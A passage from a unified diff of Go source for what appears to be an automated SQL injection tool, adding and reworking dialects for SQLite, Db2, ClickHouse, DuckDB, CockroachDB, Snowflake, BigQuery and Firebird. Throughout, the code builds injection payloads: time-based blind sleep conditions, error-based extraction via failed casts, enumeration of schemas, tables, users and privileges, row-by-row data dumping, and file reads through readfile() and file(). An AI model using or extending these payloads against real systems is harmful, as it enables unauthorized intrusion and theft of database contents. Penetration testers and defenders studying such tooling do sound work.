+			return fmt.Sprintf("(SELECT %s FROM %s%s LIMIT 1 OFFSET %d)", joinExpr(parts, "char(31)", true), quoteDouble(ref.Table), whereClause(where), offset)
 		},
 		FileRead: func(path string) (string, bool) {
 			return fmt.Sprintf("readfile(%s)", literal(path)), true
@@ -538,19 +865,111 @@ func sqliteDialect() *Dialect {
 			return fmt.Sprintf("(SELECT GROUP_CONCAT(name,char(30)) FROM sqlite_master WHERE type='table' AND name LIKE %s)", literal("%"+keyword+"%"))
 		},
 		SearchColumns: func(keyword string) string {
-			return fmt.Sprintf("(SELECT GROUP_CONCAT(name,char(30)) FROM pragma_table_info('x') WHERE name LIKE %s)", literal("%"+keyword+"%"))
+			return "''"
 		},
-		TableColumns: func(db, table string) string {
+		TableColumns: func(db, schema, table string) string {
 			return fmt.Sprintf("(SELECT GROUP_CONCAT(name||':'||type,char(30)) FROM pragma_table_info(%s))", literal(table))
 		},
 		AllTables: func() string {
-			return "(SELECT GROUP_CONCAT(name,char(30)) FROM sqlite_master WHERE type='table')"
+			return "(SELECT GROUP_CONCAT(name,char(30)) FROM sqlite_master WHERE type='table' AND name NOT LIKE 'sqlite_%')"
 		},
 		AllColumns: func() string {
-			return "(SELECT GROUP_CONCAT(name,char(30)) FROM pragma_table_info('x'))"
+			return "''"
 		},
 	}
 }
+
+// --- IBM Db2 -------------------------------------------------------------
+
+func db2Dialect() *Dialect {
+	return &Dialect{
+		Name:    "DB2",
+		Aliases: defaultAliases("DB2", "IBM DB2", "Db2"),
+		Quote:   quoteDouble,
+		Str:     literal,
+		Concat:  concatPipe,
+		Length:  func(e string) string { return "LENGTH(" + e + ")" },
+		Substr:  func(e string, p, l int) string { return fmt.Sprintf("SUBSTR(%s,%d,%d)", e, p, l) },
+		ASCII:   func(e string) string { return "ASCII(" + e + ")" },
+		Marker:  markerPipe,
+		SleepExpr: func(n int) string {
+			return fmt.Sprintf("SYSPROC.DBMS_LOCK.SLEEP(%d)", n)
+		},
+		TimeCondition: func(cond string, n int) string {
+			return fmt.Sprintf("CASE WHEN (%s) THEN SYSPROC.DBMS_LOCK.SLEEP(%d) ELSE 1 END", cond, n)
+		},
+		ErrorExpr: func(expr string) (string, bool) {
+			return fmt.Sprintf("1=CAST(CONCAT('~',(%s),'~') AS INTEGER)", expr), true
+		},
+		Databases: func() string {
+			return "(SELECT LISTAGG(DBNAME,CHR(30)) WITHIN GROUP (ORDER BY DBNAME) FROM SYSCAT.DATABASES)"
+		},
+		Schemas: func(db string) string {
+			return "(SELECT LISTAGG(SCHEMANAME,CHR(30)) WITHIN GROUP (ORDER BY SCHEMANAME) FROM SYSCAT.SCHEMATA WHERE SCHEMANAME NOT LIKE 'SYS%')"
+		},
+		Tables: func(db, schema string) string {
+			if schema == "" {
+				return "(SELECT LISTAGG(TABNAME,CHR(30)) WITHIN GROUP (ORDER BY TABNAME) FROM SYSCAT.TABLES WHERE TABSCHEMA=CURRENT SCHEMA AND TYPE='T')"
+			}
+			return fmt.Sprintf("(SELECT LISTAGG(TABNAME,CHR(30)) WITHIN GROUP (ORDER BY TABNAME) FROM SYSCAT.TABLES WHERE TABSCHEMA=%s AND TYPE='T')", literal(schema))
+		},
+		Columns: func(db, schema, table string) string {
+			if schema == "" {
+				return fmt.Sprintf("(SELECT LISTAGG(COLNAME,CHR(30)) WITHIN GROUP (ORDER BY COLNO) FROM SYSCAT.COLUMNS WHERE TABSCHEMA=CURRENT SCHEMA AND TABNAME=%s)", literal(table))
+			}
+			return fmt.Sprintf("(SELECT LISTAGG(COLNAME,CHR(30)) WITHIN GROUP (ORDER BY COLNO) FROM SYSCAT.COLUMNS WHERE TABSCHEMA=%s AND TABNAME=%s)", literal(schema), literal(table))
+		},
+		CurrentDB: func() string { return "CURRENT SERVER" },
+		Version:   func() string { return "SERVICE_LEVEL" },
+		User:      func() string { return "CURRENT_USER" },
+		Hostname:  func() string { return "CURRENT SERVER" },
+		IsDBA:     func() string { return "1" },
+		Privileges: func() string {
+			return "(SELECT LISTAGG(PRIVILEGE,CHR(30)) WITHIN GROUP (ORDER BY PRIVILEGE) FROM SYSIBM.SYSUSERAUTH)"
+		},
+		Users: func() string {
+			return "(SELECT LISTAGG(GRANTEE,CHR(30)) WITHIN GROUP (ORDER BY GRANTEE) FROM SYSCAT.DBAUTH)"
+		},
+		Passwords: func() string {
+			return "''"
+		},
+		Roles: func() string {
+			return "(SELECT LISTAGG(ROLENAME,CHR(30)) WITHIN GROUP (ORDER BY ROLENAME) FROM SYSCAT.ROLES)"
+		},
+		RowCount: func(ref TableRef, where string) string {
+			return fmt.Sprintf("(SELECT COUNT(*) FROM %s%s)", db2Table(ref), whereClause(where))
+		},
+		DumpRow: func(ref TableRef, cols []string, offset int, where string) string {
+			parts := make([]string, 0, len(cols))
+			for _, c := range cols {
+				parts = append(parts, fmt.Sprintf("COALESCE(CAST(%s AS VARCHAR(32000)),'NULL')", quoteDouble(c)))
+			}
+			return fmt.Sprintf("(SELECT %s FROM %s%s ORDER BY 1 OFFSET %d ROWS FETCH NEXT 1 ROWS ONLY)", joinExpr(parts, "CHR(31)", true), db2Table(ref), whereClause(where), offset)
+		},
+		FileRead: func(path string) (string, bool) { return "", false },
+		OSCmd:    func(cmd string) (string, bool) { return "", false },
+		SearchTables: func(keyword string) string {
+			return fmt.Sprintf("(SELECT LISTAGG(TABSCHEMA||'.'||TABNAME,CHR(30)) WITHIN GROUP (ORDER BY TABSCHEMA,TABNAME) FROM SYSCAT.TABLES WHERE TABNAME LIKE %s)", literal("%"+strings.ToUpper(keyword)+"%"))
+		},
+		SearchColumns: func(keyword string) string {
+			return fmt.Sprintf("(SELECT LISTAGG(TABSCHEMA||'.'||TABNAME||'.'||COLNAME,CHR(30)) WITHIN GROUP (ORDER BY TABSCHEMA,TABNAME,COLNAME) FROM SYSCAT.COLUMNS WHERE COLNAME LIKE %s)", literal("%"+strings.ToUpper(keyword)+"%"))
+		},
+		TableColumns: func(db, schema, table string) string {
+			if schema == "" {
+				return fmt.Sprintf("(SELECT LISTAGG(COLNAME||':'||TYPENAME,CHR(30)) WITHIN GROUP (ORDER BY COLNO) FROM SYSCAT.COLUMNS WHERE TABSCHEMA=CURRENT SCHEMA AND TABNAME=%s)", literal(table))
+			}
+			return fmt.Sprintf("(SELECT LISTAGG(COLNAME||':'||TYPENAME,CHR(30)) WITHIN GROUP (ORDER BY COLNO) FROM SYSCAT.COLUMNS WHERE TABSCHEMA=%s AND TABNAME=%s)", literal(schema), literal(table))
+		},
+		AllTables: func() string {
+			return "(SELECT LISTAGG(TABSCHEMA||'.'||TABNAME,CHR(30)) WITHIN GROUP (ORDER BY TABSCHEMA,TABNAME) FROM SYSCAT.TABLES WHERE TYPE='T')"
+		},
+		AllColumns: func() string {
+			return "(SELECT LISTAGG(TABSCHEMA||'.'||TABNAME||'.'||COLNAME,CHR(30)) WITHIN GROUP (ORDER BY TABSCHEMA,TABNAME,COLNAME) FROM SYSCAT.COLUMNS)"
+		},
+	}
+}
+
+// --- ClickHouse ----------------------------------------------------------
 
 func clickhouseDialect() *Dialect {
 	return &Dialect{
@@ -573,13 +992,20 @@ func clickhouseDialect() *Dialect {
 			return fmt.Sprintf("1=toUInt8(CONCAT('~',(%s),'~'))", expr), true
 		},
 		Databases: func() string {
-			return "(SELECT groupArray(name) FROM system.databases)"
+			return "(SELECT arrayStringConcat(groupArray(name), char(30)) FROM system.databases)"
 		},
-		Tables: func(db string) string {
-			return fmt.Sprintf("(SELECT groupArray(name) FROM system.tables WHERE database=%s)", literal(db))
+		Schemas: func(db string) string { return "" },
+		Tables: func(db, schema string) string {
+			if db == "" {
+				return "(SELECT arrayStringConcat(groupArray(name), char(30)) FROM system.tables WHERE database=currentDatabase())"
+			}
+			return fmt.Sprintf("(SELECT arrayStringConcat(groupArray(name), char(30)) FROM system.tables WHERE database=%s)", literal(db))
 		},
-		Columns: func(db, table string) string {
-			return fmt.Sprintf("(SELECT groupArray(name) FROM system.columns WHERE database=%s AND table=%s)", literal(db), literal(table))
+		Columns: func(db, schema, table string) string {
+			if db == "" {
+				return fmt.Sprintf("(SELECT arrayStringConcat(groupArray(name), char(30)) FROM system.columns WHERE database=currentDatabase() AND table=%s)", literal(table))
+			}
+			return fmt.Sprintf("(SELECT arrayStringConcat(groupArray(name), char(30)) FROM system.columns WHERE database=%s AND table=%s)", literal(db), literal(table))
 		},
 		CurrentDB: func() string { return "currentDatabase()" },
 		Version:   func() string { return "version()" },
@@ -587,26 +1013,26 @@ func clickhouseDialect() *Dialect {
 		Hostname:  func() string { return "hostName()" },
 		IsDBA:     func() string { return "1" },
 		Privileges: func() string {
-			return "(SELECT groupArray(privilege) FROM system.grants)"
+			return "(SELECT arrayStringConcat(groupArray(privilege), char(30)) FROM system.grants)"
 		},
 		Users: func() string {
-			return "(SELECT groupArray(name) FROM system.users)"
+			return "(SELECT arrayStringConcat(groupArray(name), char(30)) FROM system.users)"
 		},
 		Passwords: func() string {
 			return "''"
 		},
 		Roles: func() string {
-			return "(SELECT groupArray(name) FROM system.roles)"
+			return "(SELECT arrayStringConcat(groupArray(name), char(30)) FROM system.roles)"
 		},
-		RowCount: func(db, table string) string {
-			return fmt.Sprintf("(SELECT count() FROM %s.%s)", quoteBacktick(db), quoteBacktick(table))
+		RowCount: func(ref TableRef, where string) string {
+			return fmt.Sprintf("(SELECT count() FROM %s%s)", clickhouseTable(ref), whereClause(where))
 		},
-		DumpRow: func(db, table string, cols []string, offset int) string {
+		DumpRow: func(ref TableRef, cols []string, offset int, where string) string {
 			parts := make([]string, 0, len(cols))
 			for _, c := range cols {
 				parts = append(parts, fmt.Sprintf("ifNull(toString(%s),'NULL')", quoteBacktick(c)))
 			}
-			return fmt.Sprintf("(SELECT concat(%s) FROM %s.%s LIMIT 1 OFFSET %d)", strings.Join(parts, ",char(31),"), quoteBacktick(db), quoteBacktick(table), offset)
+			return fmt.Sprintf("(SELECT concat(%s) FROM %s%s LIMIT 1 OFFSET %d)", joinExpr(parts, "char(31)", false), clickhouseTable(ref), whereClause(where), offset)
 		},
 		FileRead: func(path string) (string, bool) {
 			return fmt.Sprintf("file(%s)", literal(path)), true
@@ -615,66 +1041,107 @@ func clickhouseDialect() *Dialect {
 			return "", false
 		},
 		SearchTables: func(keyword string) string {
-			return fmt.Sprintf("(SELECT groupArray(concat(database,'.',name)) FROM system.tables WHERE name LIKE %s)", literal("%"+keyword+"%"))
+			return fmt.Sprintf("(SELECT arrayStringConcat(groupArray(concat(database,'.',name)), char(30)) FROM system.tables WHERE name LIKE %s)", literal("%"+keyword+"%"))
 		},
 		SearchColumns: func(keyword string) string {
-			return fmt.Sprintf("(SELECT groupArray(concat(database,'.',table,'.',name)) FROM system.columns WHERE name LIKE %s)", literal("%"+keyword+"%"))
+			return fmt.Sprintf("(SELECT arrayStringConcat(groupArray(concat(database,'.',table,'.',name)), char(30)) FROM system.columns WHERE name LIKE %s)", literal("%"+keyword+"%"))
 		},
-		TableColumns: func(db, table string) string {
-			return fmt.Sprintf("(SELECT groupArray(concat(name,':',type)) FROM system.columns WHERE database=%s AND table=%s)", literal(db), literal(table))
+		TableColumns: func(db, schema, table string) string {
+			if db == "" {
+				return fmt.Sprintf("(SELECT arrayStringConcat(groupArray(concat(name,':',type)), char(30)) FROM system.columns WHERE database=currentDatabase() AND table=%s)", literal(table))
+			}
+			return fmt.Sprintf("(SELECT arrayStringConcat(groupArray(concat(name,':',type)), char(30)) FROM system.columns WHERE database=%s AND table=%s)", literal(db), literal(table))
 		},
 		AllTables: func() string {
-			return "(SELECT groupArray(concat(database,'.',name)) FROM system.tables)"
+			return "(SELECT arrayStringConcat(groupArray(concat(database,'.',name)), char(30)) FROM system.tables)"
 		},
 		AllColumns: func() string {
-			return "(SELECT groupArray(concat(database,'.',table,'.',name)) FROM system.columns)"
+			return "(SELECT arrayStringConcat(groupArray(concat(database,'.',table,'.',name)), char(30)) FROM system.columns)"
 		},
 	}
 }
+
+// --- DuckDB --------------------------------------------------------------
 
 func duckdbDialect() *Dialect {
 	d := postgresDialect()
 	d.Name = "DuckDB"
 	d.Aliases = defaultAliases("DuckDB")
 	d.Databases = func() string { return "(SELECT string_agg(database_name,chr(30)) FROM duckdb_databases())" }
-	d.Tables = func(db string) string {
-		return "(SELECT string_agg(table_name,chr(30)) FROM information_schema.tables WHERE table_schema='main')"
+	d.Schemas = func(db string) string {
+		return "(SELECT string_agg(schema_name,chr(30)) FROM information_schema.schemata WHERE schema_name NOT IN ('information_schema','pg_catalog'))"
 	}
-	d.Columns = func(db, table string) string {
-		return fmt.Sprintf("(SELECT string_agg(column_name,chr(30)) FROM information_schema.columns WHERE table_name=%s)", literal(table))
+	d.Tables = func(db, schema string) string {
+		schema = strings.TrimSpace(schema)
+		if schema == "" {
+			schema = "main"
+		}
+		return fmt.Sprintf("(SELECT string_agg(table_name,chr(30)) FROM information_schema.tables WHERE table_schema=%s AND table_type='BASE TABLE')", literal(schema))
+	}
+	d.Columns = func(db, schema, table string) string {
+		schema = strings.TrimSpace(schema)
+		if schema == "" {
+			schema = "main"
+		}
+		return fmt.Sprintf("(SELECT string_agg(column_name,chr(30)) FROM information_schema.columns WHERE table_schema=%s AND table_name=%s)", literal(schema), literal(table))
+	}
+	d.TableColumns = func(db, schema, table string) string {
+		schema = strings.TrimSpace(schema)
+		if schema == "" {
+			schema = "main"
+		}
+		return fmt.Sprintf("(SELECT string_agg(column_name||':'||data_type,chr(30)) FROM information_schema.columns WHERE table_schema=%s AND table_name=%s)", literal(schema), literal(table))
 	}
 	d.CurrentDB = func() string { return "current_database()" }
 	d.Version = func() string { return "version()" }
 	d.User = func() string { return "current_user" }
 	d.Hostname = func() string { return "'localhost'" }
 	d.IsDBA = func() string { return "1" }
-	d.RowCount = func(db, table string) string {
-		return fmt.Sprintf("(SELECT COUNT(*) FROM %s)", quoteDouble(table))
+	d.RowCount = func(ref TableRef, where string) string {
+		return fmt.Sprintf("(SELECT COUNT(*) FROM %s%s)", duckdbTable(ref), whereClause(where))
 	}
-	d.DumpRow = func(db, table string, cols []string, offset int) string {
+	d.DumpRow = func(ref TableRef, cols []string, offset int, where string) string {
 		parts := make([]string, 0, len(cols))
 		for _, c := range cols {
 			parts = append(parts, fmt.Sprintf("COALESCE(CAST(%s AS VARCHAR),'NULL')", quoteDouble(c)))
 		}
-		return fmt.Sprintf("(SELECT %s FROM %s LIMIT 1 OFFSET %d)", strings.Join(parts, "||chr(31)||"), quoteDouble(table), offset)
+		return fmt.Sprintf("(SELECT %s FROM %s%s LIMIT 1 OFFSET %d)", joinExpr(parts, "chr(31)", true), duckdbTable(ref), whereClause(where), offset)
 	}
 	return d
 }
 
+// --- CockroachDB ---------------------------------------------------------
+
 func cockroachDialect() *Dialect {
 	d := postgresDialect()
 	d.Name = "CockroachDB"
-	d.Aliases = defaultAliases("CockroachDB", "Cockroach")
+	d.Aliases = defaultAliases("CockroachDB", "Cockroach", "CRDB")
 	d.Databases = func() string {
 		return "(SELECT string_agg(database_name,chr(30)) FROM [SHOW DATABASES])"
 	}
-	d.Tables = func(db string) string {
-		return fmt.Sprintf("(SELECT string_agg(table_name,chr(30)) FROM information_schema.tables WHERE table_schema=%s)", literal("public"))
+	d.Schemas = func(db string) string {
+		return "(SELECT string_agg(schema_name,chr(30)) FROM information_schema.schemata WHERE schema_name NOT IN ('pg_catalog','information_schema','crdb_internal'))"
+	}
+	d.Tables = func(db, schema string) string {
+		schema = strings.TrimSpace(schema)
+		if schema == "" {
+			schema = "public"
+		}
+		return fmt.Sprintf("(SELECT string_agg(table_name,chr(30)) FROM information_schema.tables WHERE table_schema=%s AND table_type='BASE TABLE')", literal(schema))
+	}
+	d.Columns = func(db, schema, table string) string {
+		schema = strings.TrimSpace(schema)
+		if schema == "" {
+			schema = "public"
+		}
+		return fmt.Sprintf("(SELECT string_agg(column_name,chr(30)) FROM information_schema.columns WHERE table_schema=%s AND table_name=%s)", literal(schema), literal(table))
 	}
 	d.CurrentDB = func() string { return "current_database()" }
 	d.Version = func() string { return "version()" }
 	return d
 }
+
+// --- Snowflake -----------------------------------------------------------
 
 func snowflakeDialect() *Dialect {
 	return &Dialect{
@@ -699,11 +1166,31 @@ func snowflakeDialect() *Dialect {
 		Databases: func() string {
 			return "(SELECT LISTAGG(database_name,CHAR(30)) WITHIN GROUP (ORDER BY database_name) FROM information_schema.databases)"
 		},
-		Tables: func(db string) string {
-			return fmt.Sprintf("(SELECT LISTAGG(table_name,CHAR(30)) WITHIN GROUP (ORDER BY table_name) FROM %s.information_schema.tables WHERE table_schema='PUBLIC')", quoteDouble(db))
+		Schemas: func(db string) string {
+			if db == "" {
+				return "(SELECT LISTAGG(schema_name,CHAR(30)) WITHIN GROUP (ORDER BY schema_name) FROM information_schema.schemata WHERE schema_name <> 'INFORMATION_SCHEMA')"
+			}
+			return fmt.Sprintf("(SELECT LISTAGG(schema_name,CHAR(30)) WITHIN GROUP (ORDER BY schema_name) FROM %s.INFORMATION_SCHEMA.SCHEMATA WHERE schema_name <> 'INFORMATION_SCHEMA')", quoteDouble(db))
 		},
-		Columns: func(db, table string) string {
-			return fmt.Sprintf("(SELECT LISTAGG(column_name,CHAR(30)) WITHIN GROUP (ORDER BY ordinal_position) FROM %s.information_schema.columns WHERE table_name=%s)", quoteDouble(db), literal(strings.ToUpper(table)))
+		Tables: func(db, schema string) string {
+			schema = strings.TrimSpace(schema)
+			if schema == "" {
+				schema = "PUBLIC"
+			}
+			if db == "" {
+				return fmt.Sprintf("(SELECT LISTAGG(table_name,CHAR(30)) WITHIN GROUP (ORDER BY table_name) FROM information_schema.tables WHERE table_schema=%s)", literal(schema))
+			}
+			return fmt.Sprintf("(SELECT LISTAGG(table_name,CHAR(30)) WITHIN GROUP (ORDER BY table_name) FROM %s.INFORMATION_SCHEMA.TABLES WHERE table_schema=%s)", quoteDouble(db), literal(schema))
+		},
+		Columns: func(db, schema, table string) string {
+			schema = strings.TrimSpace(schema)
+			if schema == "" {
+				schema = "PUBLIC"
+			}
+			if db == "" {
+				return fmt.Sprintf("(SELECT LISTAGG(column_name,CHAR(30)) WITHIN GROUP (ORDER BY ordinal_position) FROM information_schema.columns WHERE table_schema=%s AND table_name=%s)", literal(schema), literal(table))
+			}
+			return fmt.Sprintf("(SELECT LISTAGG(column_name,CHAR(30)) WITHIN GROUP (ORDER BY ordinal_position) FROM %s.INFORMATION_SCHEMA.COLUMNS WHERE table_schema=%s AND table_name=%s)", quoteDouble(db), literal(schema), literal(table))
 		},
 		CurrentDB: func() string { return "CURRENT_DATABASE()" },
 		Version:   func() string { return "CURRENT_VERSION()" },
@@ -711,7 +1198,7 @@ func snowflakeDialect() *Dialect {
 		Hostname:  func() string { return "CURRENT_CLIENT()" },
 		IsDBA:     func() string { return "1" },
 		Privileges: func() string {
-			return "(SELECT LISTAGG(privilege,CHAR(30)) WITHIN GROUP (ORDER BY privilege) FROM information_schema.applicable_roles)"
+			return "(SELECT LISTAGG(role_name,CHAR(30)) WITHIN GROUP (ORDER BY role_name) FROM information_schema.applicable_roles)"
 		},
 		Users: func() string {
 			return "(SELECT LISTAGG(name,CHAR(30)) WITHIN GROUP (ORDER BY name) FROM SNOWFLAKE.ACCOUNT_USAGE.USERS)"
@@ -720,17 +1207,17 @@ func snowflakeDialect() *Dialect {
 			return "''"
 		},
 		Roles: func() string {
-			return "(SELECT LISTAGG(role,CHAR(30)) WITHIN GROUP (ORDER BY role) FROM information_schema.applicable_roles)"
+			return "(SELECT LISTAGG(role_name,CHAR(30)) WITHIN GROUP (ORDER BY role_name) FROM information_schema.applicable_roles)"
 		},
-		RowCount: func(db, table string) string {
-			return fmt.Sprintf("(SELECT COUNT(*) FROM %s.PUBLIC.%s)", quoteDouble(db), quoteDouble(table))
+		RowCount: func(ref TableRef, where string) string {
+			return fmt.Sprintf("(SELECT COUNT(*) FROM %s%s)", snowflakeTable(ref), whereClause(where))
 		},
-		DumpRow: func(db, table string, cols []string, offset int) string {
+		DumpRow: func(ref TableRef, cols []string, offset int, where string) string {
 			parts := make([]string, 0, len(cols))
 			for _, c := range cols {
 				parts = append(parts, fmt.Sprintf("COALESCE(TO_VARCHAR(%s),'NULL')", quoteDouble(c)))
 			}
-			return fmt.Sprintf("(SELECT CONCAT(%s) FROM %s.PUBLIC.%s LIMIT 1 OFFSET %d)", strings.Join(parts, ",'|',"), quoteDouble(db), quoteDouble(table), offset)
+			return fmt.Sprintf("(SELECT CONCAT(%s) FROM %s%s LIMIT 1 OFFSET %d)", joinExpr(parts, "CHAR(31)", false), snowflakeTable(ref), whereClause(where), offset)
 		},
 		FileRead: func(path string) (string, bool) {
 			return "", false
@@ -739,13 +1226,20 @@ func snowflakeDialect() *Dialect {
 			return "", false
 		},
 		SearchTables: func(keyword string) string {
-			return fmt.Sprintf("(SELECT LISTAGG(table_name,CHAR(30)) WITHIN GROUP (ORDER BY table_name) FROM information_schema.tables WHERE table_name LIKE %s)", literal("%"+strings.ToUpper(keyword)+"%"))
+			return fmt.Sprintf("(SELECT LISTAGG(table_schema||'.'||table_name,CHAR(30)) WITHIN GROUP (ORDER BY table_schema,table_name) FROM information_schema.tables WHERE table_name LIKE %s)", literal("%"+strings.ToUpper(keyword)+"%"))
 		},
 		SearchColumns: func(keyword string) string {
-			return fmt.Sprintf("(SELECT LISTAGG(column_name,CHAR(30)) WITHIN GROUP (ORDER BY column_name) FROM information_schema.columns WHERE column_name LIKE %s)", literal("%"+strings.ToUpper(keyword)+"%"))
+			return fmt.Sprintf("(SELECT LISTAGG(table_schema||'.'||table_name||'.'||column_name,CHAR(30)) WITHIN GROUP (ORDER BY table_schema,table_name,column_name) FROM information_schema.columns WHERE column_name LIKE %s)", literal("%"+strings.ToUpper(keyword)+"%"))
 		},
-		TableColumns: func(db, table string) string {
-			return fmt.Sprintf("(SELECT LISTAGG(column_name||':'||data_type,CHAR(30)) WITHIN GROUP (ORDER BY ordinal_position) FROM %s.information_schema.columns WHERE table_name=%s)", quoteDouble(db), literal(strings.ToUpper(table)))
+		TableColumns: func(db, schema, table string) string {
+			schema = strings.TrimSpace(schema)
+			if schema == "" {
+				schema = "PUBLIC"
+			}
+			if db == "" {
+				return fmt.Sprintf("(SELECT LISTAGG(column_name||':'||data_type,CHAR(30)) WITHIN GROUP (ORDER BY ordinal_position) FROM information_schema.columns WHERE table_schema=%s AND table_name=%s)", literal(schema), literal(table))
+			}
+			return fmt.Sprintf("(SELECT LISTAGG(column_name||':'||data_type,CHAR(30)) WITHIN GROUP (ORDER BY ordinal_position) FROM %s.INFORMATION_SCHEMA.COLUMNS WHERE table_schema=%s AND table_name=%s)", quoteDouble(db), literal(schema), literal(table))
 		},
 		AllTables: func() string {
 			return "(SELECT LISTAGG(table_schema||'.'||table_name,CHAR(30)) WITHIN GROUP (ORDER BY table_schema,table_name) FROM information_schema.tables)"
@@ -756,30 +1250,39 @@ func snowflakeDialect() *Dialect {
 	}
 }
 
+// --- BigQuery ------------------------------------------------------------
+
 func bigqueryDialect() *Dialect {
 	return &Dialect{
-		Name:          "BigQuery",
-		Aliases:       defaultAliases("BigQuery", "BQ"),
-		Quote:         quoteBacktick,
-		Str:           literal,
-		Concat:        concatFunc("CONCAT"),
-		Length:        func(e string) string { return "LENGTH(" + e + ")" },
-		Substr:        func(e string, p, l int) string { return fmt.Sprintf("SUBSTR(%s,%d,%d)", e, p, l) },
-		ASCII:         func(e string) string { return "ASCII(" + e + ")" },
-		Marker:        markerFunc,
-		SleepExpr:     func(n int) string { return "0" },
+		Name:    "BigQuery",
+		Aliases: defaultAliases("BigQuery", "BQ", "Google BigQuery"),
+		Quote:   quoteBacktick,
+		Str:     literal,
+		Concat:  concatFunc("CONCAT"),
+		Length:  func(e string) string { return "LENGTH(" + e + ")" },
+		Substr:  func(e string, p, l int) string { return fmt.Sprintf("SUBSTR(%s,%d,%d)", e, p, l) },
+		ASCII:   func(e string) string { return "ASCII(" + e + ")" },
+		Marker:  markerFunc,
+		SleepExpr: func(n int) string { return "0" },
 		TimeCondition: func(cond string, n int) string { return "1" },
 		ErrorExpr: func(expr string) (string, bool) {
 			return fmt.Sprintf("1=CAST(CONCAT('~',(%s),'~') AS INT64)", expr), true
 		},
 		Databases: func() string {
-			return "(SELECT STRING_AGG(schema_name,chr(30)) FROM `region-us`.INFORMATION_SCHEMA.SCHEMATA)"
+			return "(SELECT STRING_AGG(schema_name,CHR(30)) FROM `region-us`.INFORMATION_SCHEMA.SCHEMATA)"
 		},
-		Tables: func(db string) string {
-			return fmt.Sprintf("(SELECT STRING_AGG(table_name,chr(30)) FROM %s.INFORMATION_SCHEMA.TABLES)", quoteBacktick(db))
+		Schemas: func(db string) string { return "" },
+		Tables: func(db, schema string) string {
+			if db == "" {
+				return "(SELECT STRING_AGG(table_name,CHR(30)) FROM INFORMATION_SCHEMA.TABLES)"
+			}
+			return fmt.Sprintf("(SELECT STRING_AGG(table_name,CHR(30)) FROM %s.INFORMATION_SCHEMA.TABLES)", quoteBacktick(db))
 		},
-		Columns: func(db, table string) string {
-			return fmt.Sprintf("(SELECT STRING_AGG(column_name,chr(30)) FROM %s.INFORMATION_SCHEMA.COLUMNS WHERE table_name=%s)", quoteBacktick(db), literal(table))
+		Columns: func(db, schema, table string) string {
+			if db == "" {
+				return fmt.Sprintf("(SELECT STRING_AGG(column_name,CHR(30)) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=%s)", literal(table))
+			}
+			return fmt.Sprintf("(SELECT STRING_AGG(column_name,CHR(30)) FROM %s.INFORMATION_SCHEMA.COLUMNS WHERE table_name=%s)", quoteBacktick(db), literal(table))
 		},
 		CurrentDB:  func() string { return "@@project_id" },
 		Version:    func() string { return "@@version" },
@@ -790,35 +1293,40 @@ func bigqueryDialect() *Dialect {
 		Users:      func() string { return "''" },
 		Passwords:  func() string { return "''" },
 		Roles:      func() string { return "''" },
-		RowCount: func(db, table string) string {
-			return fmt.Sprintf("(SELECT COUNT(*) FROM %s.%s)", quoteBacktick(db), quoteBacktick(table))
+		RowCount: func(ref TableRef, where string) string {
+			return fmt.Sprintf("(SELECT COUNT(*) FROM %s%s)", bigqueryTable(ref), whereClause(where))
 		},
-		DumpRow: func(db, table string, cols []string, offset int) string {
+		DumpRow: func(ref TableRef, cols []string, offset int, where string) string {
 			parts := make([]string, 0, len(cols))
 			for _, c := range cols {
 				parts = append(parts, fmt.Sprintf("COALESCE(CAST(%s AS STRING),'NULL')", quoteBacktick(c)))
 			}
-			return fmt.Sprintf("(SELECT CONCAT(%s) FROM %s.%s LIMIT 1 OFFSET %d)", strings.Join(parts, ",'|',"), quoteBacktick(db), quoteBacktick(table), offset)
+			return fmt.Sprintf("(SELECT CONCAT(%s) FROM %s%s LIMIT 1 OFFSET %d)", joinExpr(parts, "CHR(31)", false), bigqueryTable(ref), whereClause(where), offset)
 		},
 		FileRead: func(path string) (string, bool) { return "", false },
 		OSCmd:    func(cmd string) (string, bool) { return "", false },
 		SearchTables: func(keyword string) string {
-			return fmt.Sprintf("(SELECT STRING_AGG(table_name,chr(30)) FROM INFORMATION_SCHEMA.TABLES WHERE table_name LIKE %s)", literal("%"+keyword+"%"))
+			return fmt.Sprintf("(SELECT STRING_AGG(table_name,CHR(30)) FROM INFORMATION_SCHEMA.TABLES WHERE table_name LIKE %s)", literal("%"+keyword+"%"))
 		},
 		SearchColumns: func(keyword string) string {
-			return fmt.Sprintf("(SELECT STRING_AGG(column_name,chr(30)) FROM INFORMATION_SCHEMA.COLUMNS WHERE column_name LIKE %s)", literal("%"+keyword+"%"))
+			return fmt.Sprintf("(SELECT STRING_AGG(column_name,CHR(30)) FROM INFORMATION_SCHEMA.COLUMNS WHERE column_name LIKE %s)", literal("%"+keyword+"%"))
 		},
-		TableColumns: func(db, table string) string {
-			return fmt.Sprintf("(SELECT STRING_AGG(CONCAT(column_name,':',data_type),chr(30)) FROM %s.INFORMATION_SCHEMA.COLUMNS WHERE table_name=%s)", quoteBacktick(db), literal(table))
+		TableColumns: func(db, schema, table string) string {
+			if db == "" {
+				return fmt.Sprintf("(SELECT STRING_AGG(CONCAT(column_name,':',data_type),CHR(30)) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=%s)", literal(table))
+			}
+			return fmt.Sprintf("(SELECT STRING_AGG(CONCAT(column_name,':',data_type),CHR(30)) FROM %s.INFORMATION_SCHEMA.COLUMNS WHERE table_name=%s)", quoteBacktick(db), literal(table))
 		},
 		AllTables: func() string {
-			return "(SELECT STRING_AGG(table_name,chr(30)) FROM INFORMATION_SCHEMA.TABLES)"
+			return "(SELECT STRING_AGG(table_name,CHR(30)) FROM INFORMATION_SCHEMA.TABLES)"
 		},
 		AllColumns: func() string {
-			return "(SELECT STRING_AGG(column_name,chr(30)) FROM INFORMATION_SCHEMA.COLUMNS)"
+			return "(SELECT STRING_AGG(column_name,CHR(30)) FROM INFORMATION_SCHEMA.COLUMNS)"
 		},
 	}
 }
+
+// --- Firebird ------------------------------------------------------------
 
 func firebirdDialect() *Dialect {
 	return &Dialect{
@@ -832,7 +1340,7 @@ func firebirdDialect() *Dialect {
 		ASCII:   func(e string) string { return "ASCII_VAL(" + e + ")" },
 		Marker:  markerPipe,
 		SleepExpr: func(n int) string {
-			return fmt.Sprintf("(SELECT COUNT(*) FROM rdb$database r1,rdb$database r2,rdb$database r3)")
+			return "(SELECT COUNT(*) FROM rdb$database r1,rdb$database r2,rdb$database r3)"
 		},
 		TimeCondition: func(cond string, n int) string {
 			return fmt.Sprintf("CASE WHEN (%s) THEN (SELECT COUNT(*) FROM rdb$database r1,rdb$database r2,rdb$database r3) ELSE 1 END", cond)
